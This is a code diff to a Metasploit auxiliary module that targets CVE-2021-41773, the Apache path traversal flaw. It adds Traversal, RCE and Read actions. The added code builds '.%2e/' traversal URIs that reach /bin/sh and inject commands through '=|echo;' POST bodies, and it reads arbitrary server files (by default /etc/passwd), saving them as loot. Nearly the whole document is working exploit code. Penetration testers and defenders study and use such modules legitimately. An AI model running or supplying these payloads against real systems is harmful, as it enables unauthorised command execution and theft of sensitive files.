@@ -34,15 +34,29 @@ class MetasploitModule < Msf::Auxiliary
           'RPORT' => 443,
           'SSL' => true
         },
-        'Notes' => {
-          'Stability' => [CRASH_SAFE],
-          'Reliability' => [REPEATABLE_SESSION],
-          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
-        }
+        'Actions' => [
+          [
+            'Traversal', {
+              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is disabled.'
+            }
+          ],
+          [
+            'RCE', {
+              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is enabled.'
+            }
+          ],
+          [
+            'Read', {
+              'Description' => 'Exploit for CVE-2021-41773 to read local file on the remote server.'
+            }
+          ]
+        ],
+        'DefaultAction' => 'Traversal'
       )
     )
 
     register_options([
+      OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),
       OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
       OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
     ])
@@ -52,26 +66,48 @@ class MetasploitModule < Msf::Auxiliary
     "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
-  def run_host(_ip)
+  def exec_traversal(cmd)
+    send_request_raw({
+      'method' => 'POST',
+      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),
+      'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"
+    })
+  end
+
+  def read_traversal
+    send_request_raw({
+      'method' => 'GET',
+      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s)
+    })
+  end
+
+  def run_host(ip)
     @proto = (ssl ? 'https' : 'http')
 
-    traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
-    data = Rex::Text.rand_text_alpha(4..8)
+    case action.name
+    when /Traversal/
+      @traversal = '.%2e/'
+      response = read_traversal
+      unless response
+        print_error(message('No response, target seems down.'))
 
-    uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
-    response = send_request_raw({
-      'method' => 'POST',
-      'uri' => uri,
-      'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;echo #{data}"
-    })
-    unless response
-      print_error(message('No response, target seems down.'))
+        return Exploit::CheckCode::Unknown
+      end
 
-      return Exploit::CheckCode::Unknown
-    end
+      case response.code
+      when 200
+        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi disabled).'))
+      when 403
+        print_warning(message('The target is vulnerable to CVE-2021-41773 (mod_cgi disabled) - but the target path doen\'t exist).'))
+      when 500
+        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi enabled).'))
+      else
+        print_error(message('The target is not vulnerable to CVE-2021-41773.'))
 
-    if response.code == 200 && response.body.include?(data)
-      print_good(message('The target is vulnerable to CVE-2021-41773.'))
+        return Exploit::CheckCode::Safe
+      end
+
+      vprint_status("Obtained HTTP response code #{response.code}.")
       report_vuln(
         host: target_host,
         name: name,
@@ -79,10 +115,45 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       return Exploit::CheckCode::Vulnerable
+    when /RCE/
+      @traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
+      rand_str = Rex::Text.rand_text_alpha(4..8)
+
+      response = exec_traversal("echo #{rand_str}")
+      if response.code == 200 && response.body.include?(rand_str)
+        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi enabled).'))
+        report_vuln(
+          host: target_host,
+          name: name,
+          refs: references
+        )
+
+        return Exploit::CheckCode::Vulnerable
+      end
+      print_error(message('The target is not vulnerable to CVE-2021-41773.'))
+
+      return Exploit::CheckCode::Safe
+    when /Read/
+      fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?
+
+      @traversal = '.%2e/' * datastore['DEPTH'] << datastore['FILEPATH']
+
+      response = read_traversal
+      unless response && response.code == 200
+        print_error('Nothing was downloaded')
+
+        return
+      end
+
+      vprint_good("#{peer} \n#{response.body}")
+      path = store_loot(
+        'apache.traversal',
+        'application/octet-stream',
+        ip,
+        response.body,
+        datastore['FILEPATH']
+      )
+      print_good("File saved in: #{path}")
     end
-
-    print_error(message('The target is not vulnerable to CVE-2021-41773.'))
-
-    return Exploit::CheckCode::Safe
   end
 end
